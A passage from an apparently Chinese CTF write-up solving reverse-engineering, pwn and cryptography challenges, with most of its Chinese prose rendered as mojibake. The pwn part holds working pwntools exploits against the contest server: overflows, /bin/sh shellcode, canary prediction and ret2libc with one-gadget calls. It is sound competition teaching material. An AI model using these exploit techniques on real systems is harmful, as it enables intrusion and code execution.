v16]print(bytes(v7))# v16 = v7 = b&#x27;do_you_konw_SYC?&#x27;# s[5] = 46# s[10] = 108# s[17] = 48v18 = [100, 111, 95, 121, 111, 117, 95, 107, 111, 110, 119, 95, 83, 89, 67, 63, 39, 199, 144, 207, 199, 232, 144, 20, 199, 241, 130, 144, 190, 146, 89, 74, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 199, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156, 235, 57, 144, 207, 199, 232, 144, 238, 199, 241, 130, 144, 190, 146, 146, 156]# ----------------------------------------# encrypt def ShiftRow(A): for i in range(0,16,4): for j in range(math.ceil(i/4)): A[i],A[i+1],A[i+2],A[i+3] = A[i+1],A[i+2],A[i+3],A[i] return Adef transform(A): tmp = [0]*16 for i in range(16): tmp[i] = A[i] x = 0 for j in range(4): for k in range(4): A[x] = tmp[4*k+j] A[x] = S[A[x]] x += 1 return As = list(b&#x27;abcde.ghijllmnopq0stuvwxyz123457&#x27;)v = [S[s[i]] for i in range(32)]v = ShiftRow(v[:16])+ShiftRow(v[16:])v = transform(v[:16])+transform(v[16:])for k in range(16): v[k] ^= v18[k] v[k+16] ^= v18[k]for k in range(32): v[k] = S[v[k]]v = ShiftRow(v[:16])+ShiftRow(v[16:])for k in range(16): v[k] ^= v18[16+k] v[k+16] ^= v18[16+k]print(v)# ----------------------------------------# decrypt S_inv = [S.index(k) for k in range(256)]def unShiftRow(A): for i in range(0,16,4): for j in range(math.ceil(i/4)): A[i],A[i+1],A[i+2],A[i+3] = A[i+3],A[i],A[i+1],A[i+2] return Adef untransform(A): A = [S_inv[A[k]] for k in range(16)] tmp = [0]*16 x = 0 for j in range(4): for k in range(4): tmp[4*k+j] = A[x] x += 1 return tmpy = c[:]for k in range(16): y[k] ^= v18[16+k] y[k+16] ^= v18[16+k]y = unShiftRow(y[:16])+unShiftRow(y[16:])for k in range(32): y[k] = S_inv[y[k]]for k in range(16): y[k] ^= v18[k] y[k+16] ^= v18[k] y = untransform(y[:16])+untransform(y[16:])y = unShiftRow(y[:16])+unShiftRow(y[16:])y = [S_inv[y[i]] for i in range(32)]print(bytes(y))# b&#x27;SYC&#123;0.o_Thls_1s_n0t_A3s_(q^_^p)&#125;&#x27; â€‹ ezandroid å–‚ï¼ä¸‰ç‚¹å‡ å•¦ï¼é¥®èŒ¶å…ˆå•¦ï¼ (flagéœ€è¦åŒ…ä¸ŠSYC{}æäº¤) åœ¨MainActivityä¸­æŸ¥çœ‹é€»è¾‘ä¸ºï¼š 1234567891011121314151617181920obj è¡¥è¶³24ä½ Xsb4 = sb2 = obj å¶æ•°ä½sb5 = sb3 = obj å¥‡æ•°ä½4ä½ä¸€ç»„a|b|c|d -&gt; æ•´æ•°key = [2023708229, -158607964, -2120859654, 1167043672]v0,v1,v2=m[0],m[1],m[2]for i in range(32): x+=0x9e3779b9 v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3)m[0]=v0for i in range(32): x+=0x9e3779b9 v2 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v1 += ((v2 &lt;&lt; 4) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; 5) + k3)m[1]=v2m[0]=v1 åŠ å¯†é€»è¾‘ä¸ºé­”æ”¹TEAï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344from Crypto.Util.number import *def encrypt(v, k): v0,v1,v2 = v[0],v[1],v[2] x = 0 delta = 0x9E3779B9 k0,k1,k2,k3 = k[0],k[1],k[2],k[3] for i in range(32): x += delta x = x &amp; 0xFFFFFFFF v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 for i in range(32): x += delta x = x &amp; 0xFFFFFFFF v2 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v2 = v2 &amp; 0xFFFFFFFF v1 += ((v2 &lt;&lt; 4) + k2) ^ (v2 + x) ^ ((v2 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v[1] = v2 v[2] = v1 return vm = b&#x27;abcdefghijkl&#x27;m = [bytes_to_long(m[4*i:4*(i+1)]) for i in range(len(m)//4)]print(m)key = [2023708229, -158607964, -2120859654, 1167043672]key = [k &amp; 0xffffffff for k in key]c = encrypt(m, key)print(c)cc = []for k in c: cc += list(long_to_bytes(k))print(cc)# bArr = bArr2 = cc = &#x27;a5f892c9cf4b730db48f6650&#x27;# ad@#E!@a123 = sb5# eCAS213@!@3 = bArr å¸¦ç¬¦å·è§£å¯†ï¼š 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; //è§£å¯†å‡½æ•°void decrypt (int* v, int* k) &#123; int v0=v[0], v1=v[2],v2=v[1], sum=(-1640531527)*64, i; int delta=0x9e3779b9; int k0=k[0], k1=k[1], k2=k[2], k3=k[3]; for (i=0; i&lt;32; i++) &#123; v1 -= ((v2&lt;&lt;4) + k2) ^ (v2 + sum) ^ ((v2&gt;&gt;5) + k3); v2 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum += 1640531527; &#125; for (i=0; i&lt;32; i++) &#123; v1 -= ((v0&lt;&lt;4) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;5) + k3); v0 -= ((v1&lt;&lt;4) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;5) + k1); sum += 1640531527; &#125; v[0]=v0; v[1]=v1; v[2]=v2;&#125; int main()&#123; int v[3]=&#123;2784531145, 3477828365, 3029296720&#125;; int k[4]=&#123;2023708229, -158607964, -2120859654, 1167043672&#125;; decrypt(&amp;v, k); printf(&quot;%x%x%x&quot;,v[0],v[1],v[2]); return 0;&#125;//543056743333546e30697472//T0Vt33Tn0itr åœ¨MainActivity2ä¸­æŸ¥çœ‹é€»è¾‘ä¸ºï¼š 12345678iArr=[-107, -106, -95, -115, -119, 127, 26, 121, -62, -20, 86, 9] = &#x27;9596a18d897f1a79c2ec5609&#x27;bytes = ad@#E!@a123 = sb5byteArrayExtra = eCAS213@!@3 = bArrbyteArrayExtra ^ bytes = iArræ•… bytes = &#x27;0n3DF4itvc0Y&#x27; åˆå¹¶å¾—åˆ°flagï¼šSYC&#123;T00nV3tD3F34Tint0vict0rY&#125; â€‹ æ˜¯ç”·äººå°±æ¥æ‰é’ˆ ç®€å•çš„æ¸¸æˆé€†å‘é€åˆ†é¢˜,æœ€ç»ˆflagè®°å¾—åŒ…è£¹ä¸ŠSYC{} ILSPYåç¼–è¯‘ï¼Œåœ¨ public class GameManager æ‰¾åˆ°ä»£ç é€»è¾‘ã€‚ 1234567891011121314151617181920212223magicc = [75, 109, 102, 63, 107, 112, 63, 108, 124, 112, 109, 122, 63, 43, 47, 63, 111, 112, 118, 113, 107, 108, 62]magic = [124, 90, 81, 8, 92, 71, 8, 90, 77, 73, 75, 64, 8, 25, 24, 24, 8, 88, 71, 65, 70, 92, 91, 9]for i in range(30): magicc = [magicc[k] ^ (i+1) for k in range(len(magicc))]print(bytes(magicc))for i in range(40): magic = [magic[k] ^ (i+1) for k in range(len(magicc))]print(bytes(magic))import hashlibm = hashlib.md5(bytes(magicc)).hexdigest().upper()print(m)# CBDDD133B60130856D3C695D9E5ED6A5 flagï¼šSYC&#123;CBDDD133B60130856D3C695D9E5ED6A5&#125; â€‹ PWNnc_pwntools12345678910111213from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,30348)r.recvuntil(b&#x27;!!!\\n&#x27;)r.send(b&#x27;a&#x27;*92+b&#x27;Syclover&#x27;)r.recvuntil(b&#x27;first one\\n&#x27;)exp=r.recvline().strip()[:-2]print(exp)r.sendline(str(eval(exp)).encode())r.interactive() â€‹ passwordæ¦‚ç‡æ€§getshellã€‚ 123456789101112from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,30941)r.recvline()pl=b&#x27;a&#x27;*(0x20+8)+p64(0x4012F3)r.send(pl)r.recvline()r.sendline(b&#x27;\\x00&#x27;)r.interactive() â€‹ ret2textå¼€äº†PIEï¼Œæ¦‚ç‡æ€§getshellã€‚ 123456789from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,31277)r.recvline()pl=b&#x27;a&#x27;*(0x50+8)+b&#x27;\\x27\\x12&#x27;r.send(pl)r.interactive() â€‹ write1æŒ‰å­—èŠ‚ä¿®æ”¹è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•° backdoor() åœ°å€ï¼Œä¿®æ”¹2ä¸ªå­—èŠ‚å³å¯ã€‚ 123456789101112131415161718192021222324252627from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,31467)r.sendline(b&#x27;abcdefghi&#x27;)# 0x40134d -&gt; 0x401225r.recvuntil(b&#x27;index:\\n&#x27;)# 0x68-0x40=40r.sendline(b&#x27;40&#x27;)r.recvuntil(b&#x27;value:&#x27;)# (0x25-0x4d)&amp;0xffffffff=0xffffffd8r.sendline(b&#x27;ffffffd8&#x27;)r.recvuntil(b&#x27;index:\\n&#x27;)# 0x68+1-0x40=41r.sendline(b&#x27;41&#x27;)r.recvuntil(b&#x27;value:&#x27;)# (0x12-0x13)&amp;0xffffffff=0xffffffffr.sendline(b&#x27;ffffffff&#x27;)r.recvuntil(b&#x27;index:\\n&#x27;)# exitr.sendline(b&#x27;-1&#x27;)r.interactive() â€‹ ret2libccontents â€‹ ezpwn å…ˆåšè¿™é¢˜ï¼Œç®€å• contents â€‹ write2æ ˆåœ°å€æ³„éœ²ï¼Œæ ˆå¯å†™ï¼Œå†™24é•¿åº¦å†…çš„shellcodeï¼Œwhileå¾ªç¯æ”¹å†™retaddrä¸ºæ ˆåœ°å€ï¼Œret2shellcodeã€‚ 1234567891011121314151617181920212223242526from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,31581)context.arch=&#x27;amd64&#x27;r.recvuntil(b&#x27;addr:&#x27;)stack_leak=eval(r.recvline())print(hex(stack_leak))pl=b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05&quot;print(len(pl))r.sendline(pl)shell_addr=stack_leak+4for i in range(6): r.recvuntil(b&#x27;index:\\n&#x27;) r.sendline(str(40+i).encode()) r.recvuntil(b&#x27;value:&#x27;) r.sendline(hex(shell_addr&gt;&gt;(8*i)&amp;0xff)[2:].encode()) r.recvuntil(b&#x27;index:\\n&#x27;)r.sendline(b&#x27;-1&#x27;)r.interactive() â€‹ fmt1.0contents â€‹ white_canary è¿œç¨‹ä¹‹å‰è®°å¾—â€œsudo ntpdate cn.pool.ntp.orgâ€ åŒæ­¥ä¸‹æ—¶é—´ init() è‡ªå·±å®ç°äº†canaryè®¡ç®—æ–¹æ³•ï¼Œç¦ç”¨äº†59ï¼Œæ— æ³• execveã€‚ ä¼ªéšæœºæ•°ç®—canary+å†™orwçš„shellcode+ret2shellcodeã€‚ 123456789101112131415161718192021222324252627282930from pwn import *from ctypes import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,31600)context.arch=&#x27;amd64&#x27;libc=cdll.LoadLibrary(&#x27;libc.so.6&#x27;)seed=libc.time(0)%60libc.srand(seed)v2 = libc.rand()v3 = libc.rand()canary = (((v2 &gt;&gt; 4) ^ (16 * v3 + (v3 &gt;&gt; 8) * (v2 &lt;&lt; 8))) &gt;&gt; 32) \\ + ((((v2 &gt;&gt; 48) + (v2 &lt;&lt; 16) * (v3 &gt;&gt; 16)) ^ (v3 &lt;&lt; 48)) &lt;&lt; 32) canary&amp;=0xffffffffffffffffprint(hex(canary))r.recvuntil(b&#x27;name:\\n&#x27;)someplace=0x404080pl=asm(shellcraft.open(&quot;./flag&quot;))pl+=asm(shellcraft.read(3, someplace, 0x20))pl+=asm(shellcraft.write(1, someplace, 0x20))r.send(pl)r.recvline()buf=0x4040E0pl=b&#x27;a&#x27;*(0x10-8)+p64(canary)+b&#x27;a&#x27;*8+p64(buf)r.sendline(pl)r.interactive() â€‹ ez_fullprotectionscanfæ³„éœ²_startåœ°å€ç»•PIEï¼Œçº¿ç¨‹æº¢å‡ºTLSè¦†ç›–canaryã€‚ 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *r=remote(&#x27;pwn.node.game.sycsec.com&#x27;,30161)elf=ELF(&#x27;./ez_fullprotection&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)r.recvline()r.recvline()r.sendline(b&#x27;x&#x27;)r.recvline()r.sendline(b&#x27;+&#x27;)r.recvuntil(b&#x27;entered &#x27;)_start=eval(r.recvuntil(b&#x27;.&#x27;)[:-1])base=_start - elf.sym._startprint(hex(base))puts_plt=base+elf.plt.putsputs_got=base+elf.got.putspop_rdi=base+0x16e3ret=base+0x101aret_addr=base+0x1541pl=b&#x27;a&#x27;*(0x30+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)pl=pl.ljust(0x870, b&#x27;a&#x27;)r.sendline(pl)puts_addr=u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:]+b&#x27;\\x00&#x27;*2)print(hex(puts_addr))libc_base=puts_addr-libc.sym.putsogg=[0xe3afe, 0xe3b01, 0xe3b04]ogg=[libc_base+k for k in ogg]pop_4=base+0x16dcpl=b&#x27;a&#x27;*(0x30+8)+p64(pop_4)+p64(0)*4+p64(ogg[0])r.sendline(pl)r.interactive() â€‹ CRYPTOSignIn Biboâ€¦Hello! ä½ å¥½! ã“ã‚“ã«ã¡ã¯! ĞŸÑ€Ğ¸Ğ²ĞµÑ‚! 5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7dâ€¦ Hmmâ€¦ Something goes wrong with my grettings bot. 16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼šSYC&#123;Hello_World_Crypto_bibobibo&#125;ã€‚ â€‹ proof_of_work é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:5526 Build your own function to solve proof_of_work! PoWä»£ç ï¼š 123456789101112131415161718192021from pwn import *from hashlib import sha256import stringfrom pwnlib.util.iters import mbruteforcer = remote(&#x27;59.110.20.54&#x27;,5526)table = string.ascii_letters+string.digitsdef PoW(): r.recvuntil(&#x27;XXXX+&#x27;) suffix = r.recv(16).decode(&#x27;utf8&#x27;) r.recvuntil(&#x27;== &#x27;) cipher = r.recvline().strip().decode(&#x27;utf8&#x27;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;XXXX: &#x27;, proof) PoW()r.interactive()# Congrats! Your flag is: SYC&#123;st3p_1nt0_1nter4ctive_Crypt0graphy&#125; â€‹ SimpleRSA So simple RSA! Waitâ€¦ Are you kidding me? https://en.wikipedia.org/wiki/RSA_(cryptosystem) hint: flag&lt;p 123456789101112import gmpy2from Crypto.Util.number import * flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;assert len(flag) == 35p,q = [getPrime(2048) for _ in &quot;__&quot;] n = p*q e = 65537 c = gmpy2.powmod(bytes_to_long(flag),e,n) print(p) print(c)#24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537#510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472 $d = e^{-1} \\bmod p,\\;\\;\\; m = c^d \\bmod p$ã€‚ 12345678e = 65537p = 24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537c = 510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472d = inverse_mod(e,p-1)m = pow(c,d,p)print(bytes.fromhex(hex(m)[2:]))b&#x27;SYC&#123;Just_a_s1mple_modular_equation&#125;&#x27; â€‹ OTPTwice I invented a new symmetric cryptosystem, and I believe you will never break it! 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import xor from os import urandom flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot; # step0: key generation &amp; distributiondef s0(msg): k1,k2 = [urandom(len(msg)) for _ in &quot;__&quot;] return k1,k2 # # step1: Alice encrypt M, and send it to Bobdef s1(msg,k1): c1 = xor(msg,k1) return c1 # step2: Bob encrypt c1, and send it to Alice def s2(msg,k2): c2 = xor(msg,k2) return c2 # step3: Alice decrypt c2, and send it to Bob.def s3(msg,k1): c3 = xor(msg,k1) return c3 # step4: Bob decrypt c3, get M.def s4(msg,k2): m_ = xor(msg,k2) return m_ def encrypt(msg,k1,k2): c1 = s1(msg,k1) c2 = s2(c1,k2) c3 = s3(c2,k1) m_ = s4(c3,k2) assert msg == m_# Here&#x27;s what hacker Eve got:def encrypt_(msg,k1,k2): c1 = s1(msg,k1) c2 = s2(c1,k2) c3 = s3(c2,k1) m_ = s4(c3,k2) if HACK == True: print(c1) print(c2) print(c3) k1,k2 = s0(flag) encrypt_(flag,k1,k2) &#x27;&#x27;&#x27;b&#x27;\\xdbi\\xab\\x8d\\xfb0\\xd3\\xfe!\\xf8Xpy\\x80w\\x8c\\x87\\xb9&#x27;b&#x27;o\\xb0%\\xfb\\xdb\\x0e\\r\\x04\\xde\\xd1\\x9a\\x08w\\xda4\\x0f\\x0cR&#x27;b&#x27;\\xe7\\x80\\xcd\\ria\\xb2\\xca\\x89\\x1a\\x9d;|#3\\xf7\\xbb\\x96&#x27;&#x27;&#x27;&#x27; æ¨å¯¼æœ‰ $m = c_1 \\oplus c_2 \\oplus c_3$ã€‚ 12345678910from Crypto.Util.strxor import strxorc1 = b&#x27;\\xdbi\\xab\\x8d\\xfb0\\xd3\\xfe!\\xf8Xpy\\x80w\\x8c\\x87\\xb9&#x27;c2 = b&#x27;o\\xb0%\\xfb\\xdb\\x0e\\r\\x04\\xde\\xd1\\x9a\\x08w\\xda4\\x0f\\x0cR&#x27;c3 = b&#x27;\\xe7\\x80\\xcd\\ria\\xb2\\xca\\x89\\x1a\\x9d;|#3\\xf7\\xbb\\x96&#x27;m = strxor(strxor(c1,c2),c3)print(m)# b&#x27;SYC&#123;I_l0v3_Crypt0&#125;&#x27; â€‹ OldAlgorithm An old algorithm but widely used nowadays. 12345678910111213141516171819from Crypto.Util.number import * import os flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;pad = lambda msg,padlen: msg+os.urandom(padlen-len(msg))flag = pad(flag,32)print(len(flag))p = [getPrime(16) for _ in range(32)] c = [bytes_to_long(flag)%i for i in p] print(&#x27;p=&#x27;,p)print(&#x27;c=&#x27;,c)&#x27;&#x27;&#x27;p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]&#x27;&#x27;&#x27; CRTç®—æ³•ã€‚ 123456p = [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]c = [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]m = crt(c,p)print(bytes.fromhex(hex(m)[2:]))# b&#x27;SYC&#123;CRT_1s_s0_ju1cy!&#125;]mC\\x9c\\xf9C/\\xfc\\xb8t\\x16&#x27; â€‹ easy_classic éå¸¸å¥½å¥—å¨ƒï¼Œä½¿æˆ‘çš„å¤å…¸æ—‹è½¬ æ¯ä¸€å±‚è§£å‡ºçš„å­—ç¬¦ä¸²ä¸ºä¸‹ä¸€å±‚zipå‹ç¼©åŒ…å¯†ç ã€‚ ç¬¬1å±‚ï¼šudzeojxuwqcuï¼ŒROT10ï¼Œå¾—ï¼šenjoythegame ç¬¬2å±‚ï¼šialhhooavtepcyrï¼Œæ …æ 7ï¼Œå¾—ï¼šilovecryptohaha ç¬¬3å±‚ï¼š5a6H5a6Z5LiH5rOV55qE6YKj5Liq5rqQ5aS0ï¼Œbase64ï¼Œå¾—ï¼šå®‡å®™ä¸‡æ³•çš„é‚£ä¸ªæºå¤´ ç¬¬4å±‚ï¼šç†Šæ›°ï¼šå‘‹é£Ÿé£Ÿé£Ÿå–å™—å±±ç¬¨ç¬¨ç ´å—„å’¯å“ˆå‹•å—¡é›œé¡å—’å˜¿å•½æ²’æ­¡ç ´å–å’¬æˆ‘å•½å¯¶ç›œå™”å’¯æ²’ï¼Œç†Šæ›°è§£å¯†ï¼Œå¾—ï¼šnever gonna give you up ç¬¬5å±‚ï¼špassword: adltlfltqrcyï¼Œkey: ğŸ‘ğŸ‘˜ğŸ‘ ğŸ‘©ğŸ‘ğŸ‘˜ğŸ‘¤ğŸ‘œï¼Œ å…ˆbase100ï¼Œå¾—ï¼škey=fairgameï¼Œå†playfairï¼Œå¾—ï¼šgenshinstart flagï¼šSYC&#123;classical_1s_fun&#125; â€‹ PolyRSA Harder RSA. Check it out! 1234567891011121314151617181920212223import gmpy2from Crypto.Util.number import * flag = b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;p,q = [getPrime(2048) for _ in &quot;__&quot;] e1,e2 = [getPrime(17) for _ in &quot;__&quot;] e = 65537n = p*q c1 = gmpy2.powmod(2*p + 3*q,e1,n)c2 = gmpy2.powmod(5*p + 7*q,e2,n) c = gmpy2.powmod(bytes_to_long(flag),e,n) print(&quot;e1=&quot;,e1)print(&quot;e2=&quot;,e2) print(&quot;c1=&quot;,c1) print(&quot;c2=&quot;,c2) print(&quot;c=&quot;,c)print(&quot;n=&quot;,n)#e1= 113717#e2= 80737#c1= 97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357#c2= 353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222#c= 375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356#n= 728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089 å‚è€ƒGKCTF 2021 - RRRRsaç›¸å…³æ¨å¯¼ï¼Œæ¶ˆå…ƒæ±‚gcdå¾— $p$ã€‚ 123456789101112131415161718e1= 113717e2= 80737e = 65537c1= 97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423